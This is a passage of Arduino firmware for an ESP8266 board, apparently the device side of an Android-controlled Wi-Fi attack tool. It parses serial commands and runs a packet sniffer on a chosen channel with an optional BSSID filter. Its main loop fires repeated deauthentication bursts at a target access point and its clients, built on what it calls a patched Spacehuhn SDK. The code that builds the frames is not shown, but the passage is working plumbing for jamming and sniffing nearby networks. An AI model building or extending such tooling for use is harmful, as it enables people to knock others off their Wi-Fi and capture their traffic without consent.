        start = i + 1;
      }
    }

    if (tokenCount < 2 || tokenCount > 3) {
      Serial.println("ERR bad_format. Expected: SNIFF <CH> [BSSID_FILTER]");
      return;
    }

    long ch = tokens[1].toInt();
    if (ch < 1 || ch > 13) {
      Serial.println("ERR bad_channel");
      return;
    }

    uint8_t* filterMac = nullptr;
    uint8_t  filterBuf[6];

    if (tokenCount == 3) {
      if (!parseMac(tokens[2], filterBuf)) {
        Serial.println("ERR bad_filter_mac");
        return;
      }
      filterMac = filterBuf;
    }

    stopAll();
    startSniffer((uint8_t)ch, filterMac);
    return;
  }

  Serial.print("ERR unknown: ");
  Serial.println(cmd);
}


// ─────────────────────────────────────────────────────────────
// NON-BLOCKING SERIAL READER
// ─────────────────────────────────────────────────────────────
//
// Replaces Serial.readStringUntil() which has a 1-second blocking
// timeout. With this reader, loop() never stalls waiting for an
// incomplete line — deauth bursts and sniffer drains keep firing
// at full rate even if the Android app is mid-write.
void readSerial() {
  while (Serial.available()) {
    char c = (char) Serial.read();
    if (c == '\n' || c == '\r') {
      if (g_lineLen > 0) {
        g_lineBuf[g_lineLen] = '\0';
        handleCommand(String(g_lineBuf));
        g_lineLen = 0;
      }
    } else if (g_lineLen < SERIAL_LINE_MAX) {
      g_lineBuf[g_lineLen++] = c;
    } else {
      // Line too long — drop and reset to avoid silent truncation
      g_lineLen = 0;
      Serial.println("ERR line_too_long");
    }
  }
}


// ─────────────────────────────────────────────────────────────
// ARDUINO LIFECYCLE
// ─────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(500);

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);  // off (active low on D1 mini)

  // All radio init via low-level SDK — never WiFi.mode() with
  // the patched Spacehuhn SDK.
  WiFi.persistent(false);
  wifi_station_set_auto_connect(0);
  wifi_station_disconnect();
  wifi_set_opmode_current(STATION_MODE);

  // Initialize sniffer ring buffer state. Globals are zero-initialized
  // by C++ runtime, but explicit reset here documents intent and
  // guards against this being copy-pasted somewhere it's not zeroed.
  memset(g_sniffRing, 0, sizeof(g_sniffRing));
  g_sniffHead  = 0;
  g_sniffTail  = 0;
  g_sniffDrops = 0;

  Serial.println("READY");
}

void loop() {
  // Feed the watchdog and let the SDK service its internal Wi-Fi
  // tasks. Cheap insurance against future code accidentally adding
  // a long-running operation that could trigger a WDT reset.
  yield();

  readSerial();

  if (g_deauthing) {
    uint32_t now = millis();
    if (now - g_lastDeauth >= DEAUTH_INTERVAL) {
      g_lastDeauth = now;
      sendDeauthBurst();
      Serial.print("DEAUTH_TX ");
      Serial.println(macToString(g_targetBSSID));
    }
  }

  if (g_cDeauthing) {
    uint32_t now = millis();
    if (now - g_lastCDeauth >= DEAUTH_INTERVAL) {
      g_lastCDeauth = now;
      sendCDeauthBurst();
    }
  }

  // Drain the sniff ring buffer.
  //
  // We consume up to N frames per loop iteration. The cap exists so
  // we don't starve other loop work (deauth bursts, serial command
  // reading) if the ring is constantly full. Anything left in the
  // ring this iteration gets picked up next iteration — yield() at
  // the top of loop() means we'll be back here in microseconds.
  if (g_sniffing) {
    uint8_t maxDrain = 4;
    while (maxDrain-- > 0 && g_sniffTail != g_sniffHead) {
      printSniffRecord(&g_sniffRing[g_sniffTail]);
      g_sniffTail = (g_sniffTail + 1) & SNIFF_RING_MASK;
    }

    // Surface buffer pressure once per second if we've been dropping
    // frames. This is informational — the user might want to reduce
    // traffic (e.g. add a BSSID filter) or accept the loss.
    static uint32_t lastDropReport = 0;
    static uint16_t lastDropCount  = 0;
    uint32_t now = millis();
    if (now - lastDropReport >= 1000) {
      uint16_t currentDrops = g_sniffDrops;
      if (currentDrops != lastDropCount) {
        Serial.print("SNIFF_DROPS ");
        Serial.println(currentDrops);
        lastDropCount = currentDrops;
      }
      lastDropReport = now;
    }
  }
}
